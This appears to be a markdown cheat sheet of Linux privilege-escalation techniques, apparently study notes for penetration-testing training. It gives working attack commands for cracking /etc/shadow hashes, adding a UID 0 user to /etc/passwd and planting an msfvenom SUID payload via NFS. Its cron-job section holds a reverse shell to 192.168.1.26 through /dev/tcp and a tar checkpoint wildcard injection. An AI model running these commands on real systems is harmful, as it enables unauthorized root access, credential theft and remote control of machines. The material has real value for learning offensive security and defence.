## Linux Privilege Escalation

![68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067](https://user-images.githubusercontent.com/87951795/131122135-fea9fb57-8ea1-4a2a-8969-347305dc1814.jpg)

Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop
Linux PrivEsc cheatsheets: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Tools:
- https://github.com/diego-treitos/linux-smart-enumeration
- https://github.com/rebootuser/LinEnum

Other Tools:
- https://github.com/linted/linuxprivchecker
- https://github.com/AlessandroZ/BeRoot
- http://pentestmonkey.net/tools/audit/unix-privesc-check

Strategy:
1. Check your user (id, whoami).
2. Run Linux Smart Enumeration with increasing levels.
3. Run LinEnum & other scripts as well!
4. If your scripts are failing and you don’t know why, you can always run 
the manual commands from this course, and other Linux PrivEsc
cheatsheets online (e.g. https://blog.g0tmi1k.com/2011/08/basic-
linux-privilege-escalation/)
5. If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file. cat ~/.*history 
6. Have a quick look around for files in your user’s home directory and other common locations (e.g. /var/backup, /var/logs).
7. Try things that don’t have many steps first, e.g. Sudo, Cron Jobs, SUID files.
8. Have a good look at root processes, enumerate their versions and search for exploits.
9. Check for internal ports that you might be able to forward to your attacking machine.
10. At the end start to think about Kernel Exploits


Permissions in Linux:
- User accounts are configured in the /etc/passwd file.
- User password hashes are stored in the /etc/shadow file.
- Groups are configured in the /etc/group file.
  - Users have a primary group (has the same name  as their user account), and can have multiple secondary (or supplementary) groups.
- Users are identified by an integer user ID (UID). (root (UID) = 0) (id & cat /proc/$$/status | grep "[UG]id")
  - Real: A user’s real ID is who they actually are (the ID defined in /etc/passwd).
  - Effective: A user’s effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID
  - Saved: saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID.

Files & Directories:  
![linux-file---folder-permissions](https://user-images.githubusercontent.com/87951795/131246543-ed68873f-40e0-49ba-b313-0e66c32baf52.gif)
- Files
  - Read – when set, the file contents can be read.
  - Write – when set, the file contents can be modified.
  - Execute – when set, the file can be executed (i.e. run as some kind of process).
- Directories
  - Execute – when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
  - Read – when set, the directory contents can be listed.
  - Write – when set, files and subdirectories can be created in the directory.
- Special Permissions
  - SUID: When set, files will get executed with the privileges of the file owner.
  - SGID: When set on a file, the file will get executed with the privileges of the file group. When set on a directory, files created within that directory will inherit the group of the directory itself.
  - -r-sr-sr-x The first s stands for the SUID and the second one stands for SGID.

## The kernel exploit:
Should be a last resort as kernel exploits can often be unstable and may be one shot or cause a system crash.
1. Enumerate kernel version (uname -a).
2. Find matching exploits use Linux Exploit Suggester 2 or (Google, ExploitDB, GitHub).  
  - https://github.com/jondonas/linux-exploit-suggester-2
```
./linux-exploit-suggester.pl -k (karnel vertion from uname -a)

or

searchsploit linux kernel 2.6.32 priv esc
searchsploit linux kernel 2.6 debian priv esc
```
3. Compile and run.
```
gcc -pthread c0w.c -o c0w
./c0w
/usr/bin/passwd
```
## Weak File Permissions
- Readable /etc/shadow:
  - cat /etc/shadow (copy password hash found between the first and second colons : to file)
  - john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
- Writable /etc/shadow:
  - mkpasswd -m sha-512 newpasswordhere
  - Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
- Writable /etc/passwd 
  - if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow.
    - root: x:0:0:root:/root:/bin/bash
    - The “x” instructs Linux to look for the password hash in the /etc/shadow file
    - openssl passwd "password"
    - root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  - Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different
    - newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  - In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password
    - root::0:0:root:/root:/bin/bash
- Backups
  - It is always worth exploring the file system looking for readable backup files. Some common places include user home directories, the / (root) directory, /tmp, and /var/backups.
    - ls -la /home/user
    - ls -la /
    - ls -la /tmp
    - ls -la /var/backups
    - ls -l /.ssh
  - If we have a ssh key
    - confirm that root logins are even allowed via SSH:
    - grep PermitRootLogin /etc/ssh/sshd_config
    - chmod 600 root_key
  
## Passwords & Keys
- History Files
  - View the contents of hidden files in the user’s home directory with filenames ending in “history
```
cat ~/.*history | less
cat .bash_history
```
- Config Files
  - Many services and programs use configuration (config) files to store settings.
  - If a service needs to authenticate to something, it might store the credentials in a config file.
  - If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user. 
```
cat myvpn.ovpn
cat /etc/openvpn/auth.txt
```
- SSH Keys
  - SSH keys can be used instead of passwords to authenticate users using SSH.
```
ls -l /.ssh
cat /.ssh/root_key
```

## NFS
NFS (Network File System) is a popular distributed file system.
NFS shares are configured in the /etc/exports file.
Remote users can mount shares, access, create, modify files.
By default, created files inherit the remote user’s id and group id 
(as owner and group respectively), even if they don’t exist on the 
NFS server.
- Show the NFS server’s export list:
  - showmount -e <target>
- Similar Nmap script:
  - nmap –sV –script=nfs-showmount <target>
- Mount an NFS share:
  - mount -o rw,vers=2 <target>:<share> <local_directory>

1. Check the contents of /etc/exports for shares with the no_root_squash option:
```
cat /etc/exports
```
2. Confirm that the NFS share is available for remote mounting
```
showmount -e <target>
```
3. Create a mount point on your local machine and mount the /tmp NFS share
```
mkdir /tmp/nfs
mount -o rw,vers=2 <target>:<share> /tmp/nfs
```
4. Using the root user on your local machine, generate a payload and save it to the mounted share 
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
5. Make sure the file has the SUID bit set, and is executable by everyone:
  ```
  chmod +xs /tmp/nfs/shell.elf
  ```
6. On the target machine, execute the file to get a root shell:
  ```
  /tmp/shell.elf
  ```
  
## Service Exploits  
Services are simply programs that run in the background, accepting input or performing regular tasks.
If vulnerable services are running as root, exploiting them can lead to command execution as root.
Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.

1. Enumerate the processes running as root
``` 
ps aux | grep "^root"
```
2. Enumerating Program Versions:
Running the program with the --version/-v command line option often shows the version number:
``` 
<program> --version 
<program> -v
``` 
  On Debian-like distributions, dpkg can show installed programs and their version:
``` 
dpkg -l | grep <program>
``` 
  On systems that use rpm, the following achieves the same:
 ``` 
rpm –qa | grep <program>
 ``` 
3. Search for the Exploit
  
## Cron Jobs
Cron jobs run with the security level of the user who owns them.
Cron table files (crontabs) store the configuration for cron jobs.
User crontabs are usually located in /var/spool/cron/ or /var/spool/cron/crontabs/
The system-wide crontab is located at /etc/crontab.
If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code.
```
cat /etc/crontab
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh
# -rwxr--rw- 1 root
```
Replace the contents of the overwrite.sh file with the following:
```
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.26/53 0>&1
```
Cron PATH Environment Variable:  
The crontab PATH environment variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file.
If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.
  
``` 
./lse.sh -l 1 -i | more
- can write to any paths present in cron jobs 

cat /etc/crontab
... 
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/ usr/bin
...
* * * * * root overwrite.sh (locate in /usr/local/sbin)
* * * * * root /usr/local/bin/compress.sh 
```  
/home/user directory is searched before any other and overwrite.sh dont specifies an absolute path 
This means we can simply create the overwrite.sh file in these /home/user directory
and the cron job should execute that file instead of the original. 
  
Create the file overwrite.sh in /home/user with the following contents:
``` 
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
``` 
Ensure that overwrite.sh is executable:
``` 
chmod +x /home/user/overwrite.sh
```  
Execute it 
``` 
/tmp/rootbash –p
``` 
  
Wildcards:  
It is possible to pass command line options (e.g. -h, --help) to commands by creating files with these names.
GTFOBins (https://gtfobins.github.io) can help determine whether a command has command line options which will be useful for our purposes.
![Screenshot 2021-08-30 at 12 37 30](https://user-images.githubusercontent.com/87951795/131327094-c3266177-7a29-4e08-a6f2-dd3505ecc07d.png)
``` 
cat /etc/crontab
cat /usr/local/bin/compress.sh

#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
  
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf -o shell.elf
  
- Copy the file to the /home/user directory on the remote host and make it executable:
chmod +x /home/user/shell.elf
  
- Create two files in the /home/user directory:
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
  
- Run a netcat listener on your local machine and wait for the cron job to run
nc -nvlp 53
``` 
  
## Sudo 
sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root.
A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file.
Rules can be used to limit users to certain programs, and forgo the password entry requirement.  
Run a program using sudo: 
```
  sudo <program>
```
Run a program as a specific user:
```
sudo –u <username> <program>
```
List programs a user is allowed (and disallowed) to run:
```
sudo -l
``` 
“switch user” (su) 
```
sudo su
```
If for some reason the su program is not allowed
```
sudo -s
sudo -i
sudo /bin/bash
sudo passwd 
```
Shell Escape Sequences:  
A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/
```
sudo -l
```
If an escape sequence exists, run the program via sudo and perform the sequence to spawn a root shell.
  
Abusing Intended Functionality
If a program doesn’t have an escape sequence, it may still be possible to use it to escalate privileges.
If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys).
If we can write to files owned by root, we may be able to insert or modify information.  
apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.
```
sudo apache2 -f /etc/shadow
```

Environment Variables:  
Programs run through sudo can inherit the environment variables from the user’s environment.
In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.
The env_keep option can be used to keep certain environment variables from the user’s environment.
The configured options are displayed when running sudo -l  
LD_PRELOAD:  
LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file.
When set, the shared object will be loaded before any others.
By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.
LD_LIBRARY_PATH:  
The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
The ldd command can be used to print the shared libraries used by a program: 
```
ldd /usr/sbin/apache2
```
By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.
  
 ## SUID / SGID Executables 
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
  
  
